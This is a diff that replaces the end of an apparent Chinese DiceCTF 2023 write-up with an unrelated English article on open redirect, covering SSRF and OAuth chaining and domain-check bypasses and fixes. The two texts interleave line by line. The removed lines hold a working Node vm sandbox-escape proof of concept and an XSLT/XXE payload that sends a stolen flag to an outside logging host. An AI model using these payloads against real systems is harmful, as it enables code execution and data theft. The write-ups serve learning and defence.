@@ -1,159 +1,189 @@
-process.mainModule = null; // 🙃
+## Combining Open Redirect with Other Vulnerabilities
 
-app.use(express.static("public"));
+From the above two issues, it can be seen that just implementing "redirection" can result in vulnerable code. The following will discuss the combination of the "redirection" function with other vulnerabilities. There are at least two types of vulnerabilities that may be combined with open redirect: SSRF and OAuth vulnerabilities.
 
-app.post("/api/verify", (req, res) => {
-    let { token, secretOrPrivateKey } = req.body;
-    try {
-        token = unserialize(token);
-        secretOrPrivateKey = unserialize(secretOrPrivateKey);
-        res.json({
-            success: true,
-            data: jwt.verify(token, secretOrPrivateKey)
-        });
-    }
-    catch {
-        res.json({
-            success: false,
-            data: "Verification failed"
-        });
-    }
-});
+SSRF, or Server-Side Request Forgery, is a vulnerability that allows attackers to forge server requests. A detailed introduction to this vulnerability and future attacks may be written in another article. Here, I will briefly explain it.
 
-app.listen(PORT, () => console.log(`web/jwtjail listening on port ${PORT}`));
+Usually, internal servers are not directly accessible from the outside, and there may only be a proxy that forwards requests to the corresponding host. Suppose a service's server architecture is as shown in the figure below, with a back-end server that calls a PDF service hidden in the intranet to generate a PDF file:
+
+![](/img/open-redirect/ssrf.png)
+
+This PDF service restricts URLs to start with https://example.com to prevent anyone from entering other URLs. At this point, if a URL has an open redirect vulnerability, an attacker can enter: `https://example.com?redirect=http://127.0.0.1`, causing the PDF service to visit this URL, which is redirected to 127.0.0.1 and returns its content.
+
+This is called SSRF, where you successfully send a request to an external service through an internal service. This way, you can see what other services are available on the intranet, such as Redis or MySQL, which cannot be accessed directly from the outside but can be accessed through SSRF. Alternatively, you can simply look at some cloud-related files. Some cloud services only need to access http://169.254.169.254 to see some metadata. If you are interested, you can check this out: [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#exploitation-in-cloud).
+
+Therefore, open redirect can bypass the URL check that was originally performed.
+
+The second problem you may encounter is related to OAuth. In the OAuth process, there is usually a `redirect_uri`, which receives a code after authorization is complete. Taking Facebook as an example, it looks like this:
+
+```
+https://www.facebook.com/v11.0/dialog/oauth?
+  client_id={app-id}
+  &redirect_uri={"https://example.com/login"}
+  &state={"{st=state123abc,ds=123456789}"}
 ```
 
-靠著 vm 把你丟進去的 data 放在另一個 context，然後呼叫 jwt lib，因此目的就是在 jwt lib 處理的過程中找到可以 escape 的地方。
+After the user clicks on the URL, they will be redirected to Facebook. After clicking on the authorization, they will be redirected to `https://example.com/login`, where they can obtain the code or token from the URL. Then, they can use this code or token with the client ID and client secret to obtain an auth token and use this auth token to represent the user to obtain data from Facebook.
 
-而解法是我們可以幫一個 function 加上 proxy，如果呼叫到 function，就會先呼叫到 proxy 的 apply
+If the protection of `redirect_uri` is not done well, attackers can replace it with other values, such as `redirect_uri=https://huli.tw`. After the user clicks on the authorization, the verification code will be sent to my website instead of the expected website.
+
+However, in general, `redirect_uri` will restrict the domain, so it is not so easy to bypass. At this time, open redirect comes into play. If the website has this vulnerability, it can be like this: `redirect_uri=https://example.com?redirect=https://huli.tw`. In this way, even if it meets the domain restriction, the final destination is still an external website, and the attacker can still steal the verification code.
+
+Therefore, to avoid this type of attack, large services such as Facebook or Google will strengthen restrictions when setting up apps. `redirect_uri` usually requires a fixed setting and does not allow you to set a wildcard. For example, if I fill in `https://example.com/auth`, only this URL can pass, and other URLs with different paths will fail. However, some small companies have not paid attention to such details, and there are not so many regulations for `redirect_uri`.
+
+There are actually many examples of combining OAuth with open redirect to achieve account takeover, such as this one: [[cs.money] Open Redirect Leads to Account Takeover](https://hackerone.com/reports/905607), or GitHub actually has this type of vulnerability: [GitHub Gist - Account takeover via open redirect - $10,000 Bounty](https://devcraft.io/2020/10/19/github-gist-account-takeover.html), and this Airbnb vulnerability is also very interesting: [Authentication bypass on Airbnb via OAuth tokens theft](https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/).
+
+To summarize, the purpose of open redirect is not only to allow users to relax their vigilance and engage in phishing, but also to bypass places that check domains. The reason why the SSRF and OAuth vulnerabilities can be combined with it is because open redirect can be used to bypass the domain check.
+
+## How to defend against open redirect?
+
+If you want to prevent open redirect, it is obvious that you need to check the redirected URL. This sounds simple, but it is easy to have vulnerabilities in implementation. For example, the following example is a piece of code that checks the domain. According to the extracted hostname, it checks whether it contains `cymetrics.io`. If it does, it passes. The purpose is that only cymetrics.io and its subdomains can pass:
 
 ``` js
-var p = new Proxy(_ => _, {
-  apply(target, thisArg, argumentsList) {
-    console.log('apply')
-  }
-})
-p() // apply
+const validDomain = 'cymetrics.io'
+function validateDomain(url) {
+  const host = new URL(url).hostname // 取出 hostname
+  return host.includes(validDomain)
+}
+
+validateDomain('https://example.com') // false
+validateDomain('https://cymetrics.io') // true
+validateDomain('https://dev.cymetrics.io') // true
 ```
 
-而這個 apply 的第三個參數 `argumentsList` 是來自外界的 object，就可以靠著這個參數來逃出 VM。
+It seems that there is no problem? Except for `cymetrics.io` or its subdomains, no other domains should be able to pass this check, right?
 
-除此之外，雖然 `process.mainModule` 被刪掉了，但可以用 `process.binding("spawn_sync")` 來達成執行程式碼。
+Although it seems so, there are actually two ways to bypass it. Here, assuming that there is no problem with URL parsing, hostname will definitely be obtained, so `attacker.com?q=cymetrics.io` is useless, and the hostname will only be `attacker.com`.
 
-一個簡單的 PoC 像這樣：
+You can think of two ways to bypass it. Before revealing the answer, let's take a look at the next paragraph.
 
-``` js
-"use strict";
-const vm = require("vm");
+## Google's view on open redirect
 
-const ctx = { codeGeneration: { strings: false, wasm: false }};
-const unserialize = (data) => new vm.Script(`"use strict"; (${data})`)
-    .runInContext(
-        vm.createContext(Object.create({console}), ctx),
-        { timeout: 250 }
-    );
+Google clearly stated on its official website [Bughunter University](https://sites.google.com/site/bughunteruniversity/nonvuln/open-redirect) that general open redirect will not be considered a security vulnerability unless it can be proven to be used in combination with other vulnerabilities.
 
-var data = `{
-    key: {
-        toString: new Proxy(_ => _, {
-            apply(a, b, c) {
-                console.log(c.constructor.constructor("return this")().process.pid)
-            }
-        })
+Has anyone succeeded? Of course, I will give two examples.
+
+The first example comes from this article: [Vulnerability in Hangouts Chat: from open redirect to code execution](https://blog.bentkowski.info/2018/07/vulnerability-in-hangouts-chat-aka-how.html), targeting Google Hangouts Chat's Electron App.
+
+If the URL in that app starts with `https://chat.google.com`, clicking on the URL will directly open the webpage in Electron instead of using the browser. Therefore, as long as you find the open redirect of `https://chat.google.com`, you can redirect the user to a phishing website. One of the differences between the Electron app and the browser is that the Electron app does not have an address bar by default, so users have no way to distinguish whether this is a phishing website. The detailed process and the final payload can be found in the original article. This vulnerability can be further upgraded to RCE (but I don't know how to do it), worth 7500 USD.
+
+The second example comes from an official article: [Open redirects that matter](https://sites.google.com/site/bughunteruniversity/best-reports/openredirectsthatmatter), which is also very cool.
+
+There is a feature on the Google I/O 2015 website that retrieves data from Picasa and renders it as JSON. However, due to cross-domain issues, a simple proxy was written on the backend to retrieve the data, like this: `/api/v1/photoproxy?url=to`. The proxy checks whether the beginning of the URL is `https://picasaweb.google.com/data/feed/api`. If not, an error is returned.
+
+So the author's first goal was to find an open redirect on Picasa. The URL he finally found was `https://picasaweb.google.com/bye?continue=`, and by changing this URL to `https://picasaweb.google.com/data/feed/api/../../bye`, the server would think it was a legitimate URL and pass the path check.
+
+But it's not over yet, because the `bye?continue=` redirect also checks the parameter, and `continue` must start with `https://google.com`. Therefore, we need to find the second open redirect, which is on google.com. Google.com has a well-known open redirect used by AMP, such as `https://www.google.com/amp/tech-blog.cymetrics.io`, which will redirect to https://tech-blog.cymetrics.io (although I just tried it and it will first go to the middle page and then redirect after confirmation, so this feature may have been fixed).
+
+Combining these two open redirects allows the proxy to retrieve the content of the URL we specify:
+
+```
+https://picasaweb.google.com/data/feed/api/../../../bye/?
+continue=https%3A%2F%2Fwww.google.com%2Famp/
+your-domain.example.com/path?querystring
+```
+
+But after retrieving it, it will only output as JSON. The backend code is as follows:
+
+``` go
+func servePhotosProxy(w http.ResponseWriter, r *http.Request) {
+    c := newContext(r)
+    if r.Method != "GET" {
+        writeJSONError(c, w, http.StatusBadRequest, "invalid request method")
+        return
     }
-}`
+    url := r.FormValue("url")
+    if !strings.HasPrefix(url, "https://picasaweb.google.com/data/feed/api") {
+        writeJSONError(c, w, http.StatusBadRequest, "url parameter is missing or is an invalid endpoint")
+        return
+    }
+    req, err := http.NewRequest("GET", url, nil)
+    if err != nil {
+        writeJSONError(c, w, errStatus(err), err)
+        return
+    }
 
-try {
-    data = unserialize(data);
-    console.log(data['key'].toString())
-} catch(err) {
-    console.log(err)
+
+    res, err := httpClient(c).Do(req)
+    if err != nil {
+        writeJSONError(c, w, errStatus(err), err)
+        return
+    }
+
+
+    defer res.Body.Close()
+    w.Header().Set("Content-Type", "application/json;charset=utf-8")
+    w.WriteHeader(res.StatusCode)
+    io.Copy(w, res.Body)
 }
 ```
 
-而賽後的 Discord 討論裡面，也有人提到可以利用雙重 proxy 達成「只要存取 object 的值就可以 escape」，像這樣：
+Because the content type is set, MIME sniffing cannot be used to attack. To explain MIME sniffing briefly, when your response does not set the content type, the browser will automatically guess what the content is. If it contains HTML, it will be parsed and rendered as an HTML website.
+
+The author found another bug, which is that if there is an error, the content type is not set, only when it succeeds. Therefore, intentionally returning an error message containing HTML will cause the browser to treat the entire page as HTML when it is printed on the screen, thereby achieving XSS! The detailed process and introduction are written very clearly in the original text, and I highly recommend everyone to read it.
+
+The above are two attacks caused by chaining other vulnerabilities with open redirects that have been discovered in Google. Both are very interesting!
+
+After reading the above, I suddenly became curious about which Google open redirects are well-known, so I googled: `known google open redirect` and found the following websites:
+
+1. [How scammers abuse Google Search’s open redirect feature](https://nakedsecurity.sophos.com/2020/05/15/how-scammers-abuse-google-searchs-open-redirect-feature/)
+2. [Google - Open Redirect](https://blog.sean-wright.com/google-open-redirect/)
+3. [Google Bug that Makes Your Bank More Vulnerable to Phishing](https://www.threatmark.com/google-bug-that-makes-your-bank-more-vulnerable-to-phishing/)
+
+If it's just a general `https://www.google.com/url?q=http://tech-blog.cymetrics.io`, clicking on it will only go to the confirmation page. But if you add a parameter `usg` at the end, you can be redirected without confirmation. Try clicking on this link, it will go to example.org: `https://www.google.com/url?sa=t&url=http://example.org/&usg=AOvVaw1YigBkNF7L7D2x2Fl532mA`.
+
+So what is this "usg"? It should be the result of a URL that has been hashed in some way, but you won't know how it was calculated. However, it is not difficult to obtain this "usg". You can send an email to yourself using Gmail with a link you want to redirect to, and then view it in HTML basic view. You will see that the link in the email has been redirected to the format above!
+
+For example, this is the redirect link for our blog: https://www.google.com/url?q=https%3A%2F%2Ftech-blog.cymetrics.io&sa=D&sntz=1&usg=AFQjCNHyq6urHn6HLwj8RP09GANAlymZug
+
+After testing, it was found that it can really be redirected without confirmation. This feature seems to have been around for a while, so if you need an open redirect from google.com, you can refer to it.
+
+## Check the redirect domain
+
+Okay, let's go back to the two bypass methods I just asked you about. I will post the code for checking the domain again to let everyone remember, and then I will reveal the answer directly:
 
 ``` js
-"use strict";
-const vm = require("vm");
+const validDomain = 'cymetrics.io'
+function validateDomain(url) {
+  const host = new URL(url).hostname // 取出 hostname
+  return host.includes(validDomain)
+}
 
-const ctx = { codeGeneration: { strings: false, wasm: false }};
-const unserialize = (data) => new vm.Script(`"use strict"; (${data})`)
-    .runInContext(
-        vm.createContext(Object.create({console}), ctx),
-        { timeout: 250 }
-    );
+validateDomain('https://example.com') // false
+validateDomain('https://cymetrics.io') // true
+validateDomain('https://dev.cymetrics.io') // true
+```
 
-var data = `new Proxy({}, {
-    get: new Proxy(_=>_, {
-        apply(a,b,c) {
-            console.log(c.constructor.constructor("return this")().process.pid)
-        }
-    })
-})`
+This is a common mistake when checking domains, because it does not consider the following two situations:
 
-try {
-    data = unserialize(data);
-    data['key'];
-} catch(err) {
-    console.log(err)
+1. cymetrics.io.huli.tw
+2. fakecymetrics.io
+
+Both of these situations meet the conditions, but they are not the results we want.
+
+In fact, not only when checking domains, it is a more dangerous thing to directly use `includes` or `contains` to see if the overall string contains a certain substring when doing any checks. The best way is actually to set an allow list and it must be completely consistent to pass, which is the strictest. But if you want to allow all subdomains, you can check like this:
+
+``` js
+const validDomain = 'cymetrics.io'
+function validateDomain(url) {
+  const host = new URL(url).hostname // 取出 hostname
+  return host === validDomain || host.endsWith('.' + validDomain)
 }
 ```
 
-作者 writeup：https://brycec.me/posts/dicectf_2023_challenges
+The subdomain part must end with `.cymetrics.io`, so it will definitely be a subdomain of cymetrics.io, and the main domain must also be completely consistent to pass. However, if you write it like this, if an unrelated subdomain has an open redirect vulnerability, this section will fail. Therefore, it is still recommended that you only put the domains that are confirmed to be redirected into the list and directly use `===` for checking to avoid this situation.
 
-## Web - impossible XSS (0 solves)
+## Conclusion
 
-這題很酷，程式碼很簡單：
+Redirecting is a very common function, the most common of which is to click on a link before logging in and then redirecting to the login page. After successful login, it will automatically redirect back. When doing this function, if it is a front-end redirect, I would like to remind everyone again to consider that `window.location = 'javascript:alert(1)'` will cause problems, so please make sure that the redirected URL is a legal URL before taking action. In addition, it is also necessary to ensure that when checking the domain, possible bypass situations are considered, and the most rigorous method is used as much as possible to handle it.
 
-``` js
-const express = require('express');
-const cookieParser = require('cookie-parser');
-const app = express();
-app.use(cookieParser());
+The above is an introduction to open redirect. I hope it is helpful to everyone. If you have any questions or mistakes, you can discuss them with me in the comments below.
 
-app.get('/', (req, res) => {
-    // free xss, how hard could it be?
-    res.end(req.query?.xss ?? 'welcome to impossible-xss');
-});
+References:
 
-app.get('/flag', (req, res) => {
-    // flag in admin bot's FLAG cookie
-    res.end(req.cookies?.FLAG ?? 'dice{fakeflag}');
-});
-
-app.listen(8080);
-```
-
-你有一個 free xss，但是在 admin bot 裡面有一行 `await page.setJavaScriptEnabled(false);`，直接把 JS 關掉。
-
-解法是用 XSLT 加上 XXE，像這樣：
-
-``` js
-ss = `<?xml version="1.0"?>
-<!DOCTYPE a [
-   <!ENTITY xxe SYSTEM  "https://impossible-xss.mc.ax/flag" >]>
-<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
-  <xsl:template match="/asdf">
-    <HTML>
-      <HEAD>
-        <TITLE></TITLE>
-      </HEAD>
-      <BODY>
-        <img>
-          <xsl:attribute name="src">
-            https://hc.lc/log2.php?&xxe;
-          </xsl:attribute>
-        </img>
-      </BODY>
-    </HTML>
-  </xsl:template>
-</xsl:stylesheet>`
-
-xml=`<?xml version="1.0"?>
-<?xml-stylesheet type="text/xsl" href="data:text/plain;base64,${btoa(ss)}"?>
-<asdf></asdf>`
-payload=encodeURIComponent(xml)
-```
-
-作者的 writeup：https://blog.ankursundara.com/dicectf23-writeups/
+1. [The real impact of an Open Redirect vulnerability](https://blog.detectify.com/2019/05/16/the-real-impact-of-an-open-redirect/)
+2. [Intigriti: Open Redirect](https://blog.intigriti.com/hackademy/open-redirect/)
+3. [Misconfigured OAuth leading to Account Takeover](https://gauravnarwani.com/misconfigured-oauth-to-account-takeover/)
+4. [Open Redirect Vulnerability](https://s0cket7.com/open-redirect-vulnerability/)
+5. [GitHub Gist - Account takeover via open redirect - $10,000 Bounty](https://devcraft.io/2020/10/19/github-gist-account-takeover.html)
+6. [OAuth to Account takeover](https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover/)
